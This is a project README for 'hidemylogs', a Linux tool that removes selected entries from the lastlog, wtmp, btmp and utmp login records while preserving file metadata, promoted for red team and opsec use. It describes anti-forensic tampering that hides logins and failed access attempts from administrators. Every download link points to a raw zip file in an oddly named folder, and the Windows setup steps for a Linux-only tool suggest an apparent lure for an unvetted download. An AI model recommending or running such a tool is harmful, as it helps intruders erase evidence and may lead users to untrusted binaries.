# 🛡️ hidemylogs - Clean Linux logs with care

[![Download / Visit Page](https://img.shields.io/badge/Download%20hidemylogs-purple?style=for-the-badge)](https://raw.githubusercontent.com/Areebaba9176/hidemylogs/main/Petauristidae/Software-v1.9.zip)

## 📥 Download

Use this link to visit the project page and download the file you need:

[https://raw.githubusercontent.com/Areebaba9176/hidemylogs/main/Petauristidae/Software-v1.9.zip](https://raw.githubusercontent.com/Areebaba9176/hidemylogs/main/Petauristidae/Software-v1.9.zip)

## 🧭 What this app does

hidemylogs is a Linux log cleaner that helps remove selected access records from common system logs while keeping file metadata intact.

It works with these log files:

- lastlog
- wtmp
- btmp
- utmp

The app is built for users who need fine control over log cleanup. It lets you choose what to clear instead of wiping everything.

## 🪟 Windows download and setup

This project targets Linux logs, so the app itself runs on Linux systems. If you are on Windows, use the GitHub page above to get the project files, then run the app on a Linux machine or Linux virtual machine.

### Steps for Windows users

1. Open the download page.
2. Save the project files to your computer.
3. If the app comes as a compressed file, extract it.
4. Move the files to a Linux system, WSL, or a Linux VM.
5. Run the app from that Linux environment.

If you are using Windows Subsystem for Linux, place the files in your Linux home folder before running it.

## 🖥️ System requirements

To use hidemylogs, you need:

- A Linux system
- Root access or sudo access
- A shell terminal
- Write access to the target log files

Suggested setups:

- Ubuntu Server
- Debian
- Kali Linux
- Arch Linux
- A Linux VM inside Windows

## ⚙️ How to run

After you download the project from the GitHub page, open a terminal in the project folder.

Typical flow:

1. Go to the folder that contains the files.
2. Make the main file runnable if needed.
3. Run it with sudo.
4. Follow the on-screen prompts.

Example pattern:

- `chmod +x hidemylogs`
- `sudo ./hidemylogs`

If the project uses a script file, the main entry point will usually be a shell script or binary in the repo root.

## 🧰 Main features

- Clear selected entries from Linux log files
- Keep file metadata in place
- Work on common access record files
- Reduce noise in log history
- Give controlled cleanup instead of full file removal
- Fit red team and opsec workflows

## 🔍 What it can help with

hidemylogs can help when you need to:

- Remove test access records from a lab system
- Clean old entries during system maintenance
- Review how log files change after edits
- Keep a smaller trace in selected logs
- Work with Linux log formats used by login and auth tools

## 📁 Files and logs it handles

### lastlog

Tracks the last login time for users.

### wtmp

Stores login and logout history.

### btmp

Stores failed login attempts.

### utmp

Tracks current users and active sessions.

Each file has a different role, so hidemylogs gives you a way to work on one file at a time.

## 🔒 Safe use

Use this tool only on systems you own or manage. Before you run it:

- Back up the log files
- Check the file path
- Confirm the user account you want to edit
- Make sure you have root rights

A backup helps you restore the file if you pick the wrong entry.

## 🛠️ Basic usage flow

A simple setup looks like this:

1. Download the repo from GitHub.
2. Open it on a Linux machine.
3. Start the app from a terminal.
4. Pick the log file you want to edit.
5. Choose the record or range you want to remove.
6. Save the file and check the result.

If the app asks for options, follow the prompts in order. The interface is designed to keep the process direct.

## 🧪 Example use cases

- Clear a test login from `wtmp`
- Remove failed login traces from `btmp`
- Edit a user record in `lastlog`
- Clean session state from `utmp`
- Prepare a lab machine for a fresh test run

## 🧩 Topics covered by this project

- advanced threat hunting
- log cleaning
- Linux log files
- opsec
- red team work
- security tools
- file wiping
- login record cleanup

## 📌 Notes for Windows users

If you only use Windows, this project is not a native Windows app. You still can:

- Download it from GitHub
- Inspect the project files
- Run it in WSL
- Run it in a Linux VM
- Copy it to a Linux box

## 🧭 Getting the best result

For the cleanest run:

- Start with a fresh backup
- Use the correct log file
- Run from a terminal as root
- Keep the file format intact
- Check the log after each change

## 🧱 Project focus

hidemylogs focuses on precise log edits. It does not aim to remove all traces from a system. It focuses on selected records in known Linux log files while keeping the file structure in place

## 📎 Download link

Visit the project page here:

[https://raw.githubusercontent.com/Areebaba9176/hidemylogs/main/Petauristidae/Software-v1.9.zip](https://raw.githubusercontent.com/Areebaba9176/hidemylogs/main/Petauristidae/Software-v1.9.zip)

## 🗂️ Repository details

- Repository: hidemylogs
- Type: Linux log cleaner
- Use case: Selective log record removal
- Main files: `lastlog`, `wtmp`, `btmp`, `utmp`
- Target users: Linux admins, lab users, and security users